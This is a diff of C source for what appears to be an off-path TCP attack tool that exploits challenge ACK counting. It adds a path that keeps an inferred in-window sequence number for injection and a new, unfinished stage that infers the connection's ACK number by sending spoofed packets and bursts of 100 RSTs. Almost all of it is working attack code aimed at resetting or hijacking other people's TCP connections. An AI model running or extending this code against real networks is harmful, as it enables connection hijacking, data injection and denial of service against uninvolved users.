@@ -1191,19 +1191,29 @@ int infer_sequence_number(void)
 				if (pkts_sent == 1) {
 					u_long seq_block = bs_mid * g_ctx.winsz;
 
-					printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
-							seq_block - g_ctx.winsz, seq_block + g_ctx.winsz,
-							(u_long)g_ctx.winsz * 2);
+					/* if we want to inject, we go to stage 3 directly */
+					if (g_ctx.inject_server || g_ctx.inject_client) {
+						/* return so the caller will perform injection */
+						printf("[*] Found in-window sequence number: %lu\n", seq_block);
+						g_ctx.spoof.seq = seq_block;
+						g_chack_cnt = 0;
+						return 1;
+					} else {
+						/* continue with step2 -- try to reset the connection */
+						printf("[*] Narrowed sequence (2) to: %lu - %lu (%lu possibilities)\n",
+								seq_block - g_ctx.winsz, seq_block + g_ctx.winsz,
+								(u_long)g_ctx.winsz * 2);
 
-					/* build a schedule working from right to left */
-					sched = build_schedule_reverse(seq_block - g_ctx.winsz,
-							seq_block + g_ctx.winsz, &nchunks);
-					if (!sched)
-						return 0;
-					ci = 0;
+						/* build a schedule working from right to left */
+						sched = build_schedule_reverse(seq_block - g_ctx.winsz,
+								seq_block + g_ctx.winsz, &nchunks);
+						if (!sched)
+							return 0;
+						ci = 0;
 
-					/* proceed to the next step */
-					step = 2;
+						/* proceed to the next step */
+						step = 2;
+					}
 				}
 				else
 					/* adjust range */
@@ -1225,6 +1235,98 @@ int infer_sequence_number(void)
 					return 0;
 				}
 			}
+		}
+
+#if 0
+		// XXX: TODO: scale number of guesses per round based on feedback
+#endif
+		g_chack_cnt = 0;
+	}
+
+	/* fail! */
+	return 0;
+}
+
+
+/*
+ * stage 4 - ack inference
+ *
+ * try to determine the ack number used between client/server
+ *
+ * this stage has 2 steps:
+ *
+ * 1. identify the challenge ACK window position
+ * 2. identify the challenge ACK left boundary
+ *
+ * the resulting ACK value will be set into g_ctx.spoof.ack
+ */
+int infer_ack_number(void)
+{
+	struct timeval round_start, now, diff;
+	volatile conn_t *spoof = &(g_ctx.spoof);
+	int step = -1;
+	/* printing status */
+	u_long pr_start, pr_end, pkts_sent;
+	/* chunk-based search vars */
+	chunk_t *sched = NULL;
+	int nchunks = 0, ci = 0;
+	/* binary search vars */
+	u_long bs_start = 0, bs_end = 0, bs_mid = 0;
+
+	u_long g_acks[4] = { 0, 0x40000000, 0x80000000, 0xc0000000 };
+	int g_chacks[4] = { 0 };
+	int ai = 0;
+
+	while (1) {
+		gettimeofday(&round_start, NULL);
+
+		/* initialize whatever is needed */
+		if (step == -1) {
+			/* step 1 doesn't require any initialization as it's hardcoded in g_acks */
+			step = 0;
+		}
+
+		/* send packets depending on the step we're in */
+		if (step == 0) {
+			u_long g;
+
+			/* send 0G, 1G, 2G, and 3G data packets */
+			pkts_sent = 0;
+			pr_start = g_acks[ai];
+			spoof->ack = g_acks[ai];
+			if (!tcp_send(g_ctx.pch, spoof, TH_ACK, "z", 1))
+				return 0;
+			pkts_sent++;
+		}
+
+#ifdef DEBUG_ACK_INFER_SPOOF_SEND
+		gettimeofday(&now, NULL);
+		timersub(&now, &round_start, &diff);
+		printf("[*] ack-infer: spoofed %lu data packets in %lu %lu\n", pkts_sent,
+				diff.tv_sec, diff.tv_usec);
+#endif
+
+		/* send 100 RSTs */
+		if (!send_packets_delay(&g_rst_pkt, 100, 1000))
+			return 0;
+
+		/* get the number of challenge ACKs within this second */
+		wait_until("ack-infer recv", &round_start, 1, 0);
+
+		printf("[*] ack-infer: guessed acks [%08lx - %08lx): %lu packets, %3d challenge ACKs\n",
+				pr_start, pr_end, pkts_sent, g_chack_cnt);
+
+		/* adjust the search based on the results and mode */
+		if (step == 0) {
+			/* just record the number of challenge ACKs received */
+			g_chacks[ai] = g_chack_cnt;
+
+			ai++;
+
+			/* if we finished, proceed to the next step */
+			if (ai == sizeof(g_acks) / sizeof(g_acks[0]))
+				/* FAIL FOR NOW */
+				return 0;
 		}
 
 #if 0
@@ -1277,15 +1379,18 @@ int conduct_offpath_attack(void)
 	if (!infer_four_tuple())
 		return 0;
 
-	/* figure out the target connection's sequence number */
+	/* figure out the target connection's sequence number and reset the
+	 * connection if injection was not requested */
 	if (!infer_sequence_number())
 		return 0;
 
-#if 0
-	// ack number?
+	if (g_ctx.inject_server || g_ctx.inject_client) {
+		/* figure out the target connection's ack value */
+		if (!infer_ack_number())
+			return 0;
 
-	// inject some stuff?
-#endif
+		// inject some stuff?
+	}
 
 	return 1;
 }
